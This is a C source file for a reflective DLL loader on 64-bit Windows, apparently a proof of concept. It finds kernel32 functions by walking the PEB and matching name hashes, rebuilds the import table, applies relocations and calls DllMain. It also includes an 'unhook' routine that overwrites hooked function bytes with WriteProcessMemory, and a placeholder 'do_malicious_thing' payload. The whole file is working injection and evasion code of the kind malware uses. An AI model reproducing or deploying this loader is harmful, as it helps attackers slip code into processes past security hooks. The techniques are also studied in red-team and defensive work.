#include "reflective_loader.h"
#include <intrin.h>
#include <string.h>
#include <winbase.h>
#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include <winuser.h>
#pragma comment(lib, "user32.lib")

/*
 * this currently only works for 64-bit Windows, although a 32-bit
 * implementation should not have much to change, retrieving PEB will be
 * fs[0x30:] instead, and some tables will have different sizes like the import
 * lookup table
 * 32-bit version also needs to only take a 32-bit address from unhook bytes
 */

// this pragma stops the function from being inlined
// if we inline this function, then _ReturnAddress() will not get us the address
// of load(), since ret_address_wrapper() was not actually called

#pragma intrinsic(_ReturnAddress)
DWORD_PTR ret_address_wrapper() { return (DWORD_PTR)_ReturnAddress(); }

wchar_t wide_to_lower(wchar_t c) {
  if (c >= 65 && c <= 90) {
    return c + 32;
  }
  return c;
}

char to_lower(char c) {
  if (c >= 65 && c <= 90) {
    return c + 32;
  }
  return c;
}

DWORD widestr_hash(wchar_t *str, int index) {
  DWORD sum = 0;
  DWORD count = 1;
  while (*str && count - 1 < index) {
    // random 'hash'
    sum += (DWORD)(wide_to_lower(*str)) * count + sum / 3;
    str++;
    count++;
  }
  return sum;
}

// index is optional, make it negative or > strlen(str) for it to not matter
DWORD str_hash(char *str, int index) {
  DWORD sum = 0;
  DWORD count = 1;
  while (*str && count - 1 < index) {
    sum += (DWORD)(*str) * count + sum / 3;
    str++;
    count++;
  }
  return sum;
}

// index is optional, make it negative or > strlen(str) for it to not matter
DWORD stri_hash(char *str, int index) {
  DWORD sum = 0;
  DWORD count = 1;
  while (*str && count - 1 < index) {
    sum += (DWORD)(to_lower(*str)) * count + sum / 3;
    str++;
    count++;
  }
  return sum;
}

int find_char(const char *str, char char_to_find) {
  DWORD count = 0;
  while (*str) {
    if (*str == char_to_find) {
      return count;
    }
    str++;
    count++;
  }
  return -1;
}

int wide_find_char(const wchar_t *str, wchar_t char_to_find) {
  DWORD count = 0;
  while (*str) {
    if (*str == char_to_find) {
      return count;
    }
    str++;
    count++;
  }
  return -1;
}

FARPROC get_module_export(DWORD_PTR dll_base, DWORD function_name_hash) {
  PIMAGE_NT_HEADERS dll_pe_headers =
      (PIMAGE_NT_HEADERS)(dll_base + ((PIMAGE_DOS_HEADER)dll_base)->e_lfanew);

  PIMAGE_DATA_DIRECTORY export_directory =
      &((dll_pe_headers)
            ->OptionalHeader.DataDirectory)[IMAGE_DIRECTORY_ENTRY_EXPORT];

  PIMAGE_EXPORT_DIRECTORY export_table =
      (PIMAGE_EXPORT_DIRECTORY)(export_directory->VirtualAddress + dll_base);

  // get different export tables
  LPDWORD address_table = dll_base + export_table->AddressOfFunctions;
  LPDWORD name_pointer_table = dll_base + export_table->AddressOfNames;
  LPWORD ordinal_table = dll_base + export_table->AddressOfNameOrdinals;

  // better hope the function exists here or we're gonna segfault
  while (1) {
    if (str_hash((char *)(dll_base + *name_pointer_table), -1) ==
        function_name_hash) {
      DWORD_PTR addr = address_table[*ordinal_table];
      // sometimes the address table has the address to a  forwarding string
      // instead of the RVA of the address of the function/symbol definition
      // if this is the case, `addr` will be within the export directory and
      // will be of the form <module>.<func_name>, which tells us where to find
      // the actual function definition

      if (addr > export_directory->VirtualAddress &&
          addr < export_directory->VirtualAddress + export_directory->Size) {

        DWORD dot_location = find_char(dll_base + addr, '.');
        DWORD module_hash = stri_hash(dll_base + addr, dot_location);
        DWORD func_hash = str_hash(dll_base + addr + dot_location + 1, -1);
        // this assumes that the module is already loaded in, which might not be
        // the case, but hopefully it is
        return get_function_pointer(module_hash, func_hash);
      } else {
        return (FARPROC)(dll_base + addr);
      }
    }
    name_pointer_table++;
    ordinal_table++;
  }
}

// here, defining_dll_hash is the hash of the dll/module _without_ its
// extension. e.g. the hash of ntdll as opposed to ntdll.dll
FARPROC get_function_pointer(DWORD defining_dll_hash,
                             DWORD function_name_hash) {
  // https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
  PPEB peb = (PPEB)__readgsqword(0x60);

  PPEB_LDR_DATA peb_ldr = peb->Ldr;

  PLIST_ENTRY first_module = &peb_ldr->InMemoryOrderModuleList;
  PLIST_ENTRY current_module = peb_ldr->InMemoryOrderModuleList.Flink;

  // iterate over list of modules until we find one with name that matches the
  // dll name
  do {
    // BaseDllName is not in the struct exported by windows api, so we just add
    // the offset. makes it a bit unstable
    PUNICODE_STRING dll_name =
        (PUNICODE_STRING)((DWORD_PTR)current_module + 0x048);
    if (widestr_hash(dll_name->Buffer,
                     wide_find_char(dll_name->Buffer, L'.')) ==
        defining_dll_hash) {
      break;
    }
    current_module = current_module->Flink;
  } while (first_module != current_module);

  if (first_module == current_module) {
    return NULL;
  }

  // ms-dos header -> export directory
  DWORD_PTR dll_base =
      (DWORD_PTR)(CONTAINING_RECORD(current_module, LDR_DATA_TABLE_ENTRY,
                                    InMemoryOrderLinks))
          ->DllBase;

  return get_module_export(dll_base, function_name_hash);
}

// returns base ptr
DWORD_PTR do_load() {
  // we need to get the location of this DLL's base address in the target
  // process' address space.
  // we can't use something like GetModuleHandleA because this is a library
  // function and our IAT is not yet setup to allow us to call library
  // functions.

  // so instead, we call into a function (ret_address_wrapper) and use the
  // intrinsic _ReturnAddress() which gets us ~the address of this function!

  DWORD_PTR base_addr = ret_address_wrapper();
  PIMAGE_NT_HEADERS pe_headers;

  /* Structure:
   * -----------------
   * | MS-DOS HEADER |
   * -----------------
   * | MS_DOS STUB   |
   * -----------------
   * | ????????????  |
   * -----------------
   * |  PE HEADERS   |
   *
   */

  // essentially keep going back 1 byte until we find the start of the MS-DOS
  // header
  // https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#ms-dos-stub-image-only
  while (1) {
    // docs for IMAGE_DOS_HEADER:
    // http://pinvoke.net/default.aspx/Structures.IMAGE_DOS_HEADER
    if (((PIMAGE_DOS_HEADER)base_addr)->e_magic == IMAGE_DOS_SIGNATURE) {
      DWORD_PTR pe_header_offset = ((PIMAGE_DOS_HEADER)base_addr)->e_lfanew;

      // we could have bytes that alias the MS-DOS signature, e.g. pop r10, so
      // to prevent segfaulting or other issues when trying to dereference and
      // get the PE headers, we check that the offset is <0x200
      // this is pretty arbitrary, when inspecting compiled .exe files there
      // seems to be a random amount of data after the stub
      if (pe_header_offset < 0x200) {

        pe_headers = (PIMAGE_NT_HEADERS)(base_addr + pe_header_offset);
        if (pe_headers->Signature == IMAGE_NT_SIGNATURE) {
          break;
        }
      }
    }
    base_addr--;
  }

  // now we need to find the kernel32.dll library functions we need, like
  // LoadLibraryA();

  // kind of inefficient, we need to traverse all of the data structures
  // multiple times if we make get_function_pointer utilise the lexical ordering
  // of functions and do binary search this basically becomes a non-issue
  // though.

  // we need LoadLibrary for loading our dependencies in the import table
  // kernel32.dll
  HANDLE (*LoadLibraryA_ptr)(LPCSTR) = get_function_pointer(7982, 32394);

  // we need GetProcAddress to find the location of symbols we are importing
  // kernel32.dll
  FARPROC(*GetProcAddress_ptr)
  (HMODULE, LPCSTR) = get_function_pointer(7982, 61262);

  // kernel32.dll
  BOOL(*FlushInstructionCache_ptr)
  (HANDLE, LPCVOID, SIZE_T) = get_function_pointer(7982, 520395);

  // other PoCs might allocate space for themselves to make sure all the
  // sections line up, but we do that in the injector so we do not have
  // to do that here

  PIMAGE_DATA_DIRECTORY import_directory = &(
      (pe_headers->OptionalHeader.DataDirectory)[IMAGE_DIRECTORY_ENTRY_IMPORT]);

  PIMAGE_IMPORT_DESCRIPTOR import_table =
      import_directory->VirtualAddress + base_addr;

  // end of import table signified by null
  // could check the entire struct, but just checking
  // a single field here
  while (import_table->Name) {
    // unfortunately can't reflectively load all dependencies :(
    HMODULE imported_module =
        (*LoadLibraryA_ptr)((LPCSTR)(import_table->Name + base_addr));

    PIMAGE_NT_HEADERS module_pe_headers =
        (DWORD_PTR)imported_module +
        ((PIMAGE_DOS_HEADER)imported_module)->e_lfanew;

    PIMAGE_DATA_DIRECTORY export_directory =
        &((module_pe_headers->OptionalHeader
               .DataDirectory)[IMAGE_DIRECTORY_ENTRY_EXPORT]);

    PIMAGE_EXPORT_DIRECTORY export_table =
        (DWORD_PTR)imported_module + export_directory->VirtualAddress;

    DWORD *address_array =
        (DWORD_PTR)imported_module + export_table->AddressOfFunctions;

    // import lookup table tells us how we are finding our import
    PIMAGE_THUNK_DATA import_lookup_table =
        import_table->OriginalFirstThunk + base_addr;

    // import name table tells us the name of symbol we are looking for (if
    // importing by name)
    PIMAGE_THUNK_DATA import_name_table = import_table->Name + base_addr;

    // import address table is parallel with import lookup table, and is what we
    // are rebuilding
    PIMAGE_THUNK_DATA import_address_table =
        import_table->FirstThunk + base_addr;

    // end of lookup table signified by null
    while (import_lookup_table->u1.Ordinal) {
      // if importing by ordinal, lookup in export table
      if (IMAGE_SNAP_BY_ORDINAL(import_lookup_table->u1.Ordinal)) {
        // find and normalise ordinal
        DWORD ordinal = (IMAGE_ORDINAL(import_lookup_table->u1.Ordinal)) -
                        export_table->Base;
        import_address_table->u1.Function =
            (DWORD_PTR)imported_module + address_array[ordinal];
      }
      // if importing by name, use GetProcAddress
      // i think we can use GetProcAddress for ordinals, but it didn't work for
      // me
      else {
        LPCSTR name = ((PIMAGE_IMPORT_BY_NAME)(
                           import_lookup_table->u1.AddressOfData + base_addr))
                          ->Name;

        // import_address_table->u1.Function =
        // get_module_export(imported_module, str_hash(name, -1));
        import_address_table->u1.Function =
            (*GetProcAddress_ptr)(imported_module, name);
      }
      // put address of symbol in table
      import_lookup_table++;
      import_address_table++;
    }
    import_table++;
  }

  // now we must relocate, by traversing the relocation table and applying the
  // following delta

  DWORD_PTR relocation_delta =
      base_addr - (DWORD_PTR)(pe_headers->OptionalHeader.ImageBase);

  PIMAGE_DATA_DIRECTORY relocation_directory =
      &((pe_headers->OptionalHeader
             .DataDirectory)[IMAGE_DIRECTORY_ENTRY_BASERELOC]);

  /*
  Relocation table format:

  8 byte relocation block,

  variable number of 'relocation_table_entries'

  repeat
  */
  PBASE_RELOCATION_BLOCK relocation_table =
      relocation_directory->VirtualAddress + base_addr;

  DWORD relocations_left_to_process = relocation_directory->Size;

  while (relocations_left_to_process > 0) {
    DWORD_PTR reloc_page_addr = relocation_table->PageAddress + base_addr;

    // get first entry
    PRELOCATION_TABLE_ENTRY entry =
        (DWORD_PTR)relocation_table + sizeof(BASE_RELOCATION_BLOCK);
    // calculate number of entries for this page
    DWORD entries_to_process =
        (relocation_table->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) /
        sizeof(RELOCATION_TABLE_ENTRY);

    while (entries_to_process > 0) {

      DWORD_PTR address_to_apply_reloc = reloc_page_addr + entry->Offset;

      // apply different reloc based on entry type
      // types like IMAGE_REL_BASED_HIGHADJ are apparently buggy
      // (see https://corkamiwiki.github.io/PE) so we ignore it here
      // types for non-x86 architectures are ignored here
      if (entry->Type == IMAGE_REL_BASED_ABSOLUTE) {
      } else if (entry->Type == IMAGE_REL_BASED_HIGH) {
        *((WORD *)(address_to_apply_reloc)) += HIWORD(relocation_delta);
      } else if (entry->Type == IMAGE_REL_BASED_LOW) {
        *((WORD *)(address_to_apply_reloc)) += LOWORD(relocation_delta);
      } else if (entry->Type == IMAGE_REL_BASED_HIGHLOW) {
        *((DWORD *)(address_to_apply_reloc)) += (DWORD)relocation_delta;
      } else if (entry->Type == IMAGE_REL_BASED_DIR64) {
        *((DWORDLONG *)(address_to_apply_reloc)) += relocation_delta;
      }

      entry++;
      entries_to_process--;
    }

    relocations_left_to_process -= relocation_table->BlockSize;
    relocation_table =
        (DWORD_PTR)relocation_table + (DWORD_PTR)(relocation_table->BlockSize);
  }

  // loading all done! all that is left to do is call DLLMain!

  // need to make sure our changes persist
  (*FlushInstructionCache_ptr)((HANDLE)-1, NULL, NULL);
  return base_addr;
}

DLLEXPORT void reflective_load() {
  DWORD_PTR base_addr = do_load();
  PIMAGE_NT_HEADERS pe_headers =
      ((PIMAGE_DOS_HEADER)base_addr)->e_lfanew + base_addr;
  BOOL(*DllMain_ptr)
  (HINSTANCE, DWORD, LPVOID) =
      pe_headers->OptionalHeader.AddressOfEntryPoint + base_addr;

  DllMain_ptr((HINSTANCE)base_addr, DLL_PROCESS_ATTACH, 0);
}

void call_dll_main(DWORD_PTR base_addr) {
  PIMAGE_NT_HEADERS pe_headers =
      ((PIMAGE_DOS_HEADER)base_addr)->e_lfanew + base_addr;
  BOOL(*DllMain_ptr)
  (HINSTANCE, DWORD, LPVOID) =
      pe_headers->OptionalHeader.AddressOfEntryPoint + base_addr;
  DllMain_ptr((HINSTANCE)base_addr, DLL_PROCESS_ATTACH, 0);
}

void do_malicious_thing() {
  MessageBoxA(NULL, "Done a malicious thing!", "Done a malicious thing!", 0);
}

DWORD_PTR unhook(DWORD_PTR base_addr) {

  // kernel32
  BOOL(*WriteProcessMemory_ptr)
  (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *) =
      get_function_pointer(7982, 214532);
  DWORD_PTR func_addr = *((DWORD_PTR *)(base_addr + 2));
  BYTE hook_size = *((BYTE *)(base_addr + 2 + sizeof(func_addr)));

  // TODO: use something other than writeprocessmemory
  (*WriteProcessMemory_ptr)((HANDLE)-1, func_addr,
                            base_addr + 3 + sizeof(func_addr), hook_size, NULL);

  return func_addr;
}

DLLEXPORT void reflective_load_unhook(PVOID Ptr) {
  DWORD_PTR base_addr = do_load();
  PIMAGE_NT_HEADERS pe_headers =
      ((PIMAGE_DOS_HEADER)base_addr)->e_lfanew + base_addr;
  BOOL(*DllMain_ptr)
  (HINSTANCE, DWORD, LPVOID) =
      pe_headers->OptionalHeader.AddressOfEntryPoint + base_addr;

  // currently, the injector writes the unhook bytes and the func address to
  // our DOS headers, so we don't need to hardcode hooked function or
  // unhook bytes, but still need to deal with parameters, less portable
  // than it could be, not sure what solution is, i have a feeling that there is
  // none

  BOOL(*FlushInstructionCache_ptr)
  (HANDLE, LPCVOID, SIZE_T) = get_function_pointer(7982, 520395);

  PVOID (*func_ptr)(PVOID) = unhook(base_addr);

  (*FlushInstructionCache_ptr)((HANDLE)-1, NULL, NULL);

  (*func_ptr)(Ptr);

  (*DllMain_ptr)((HINSTANCE)base_addr, DLL_PROCESS_ATTACH, 0);
}

int main() { do_load(); }
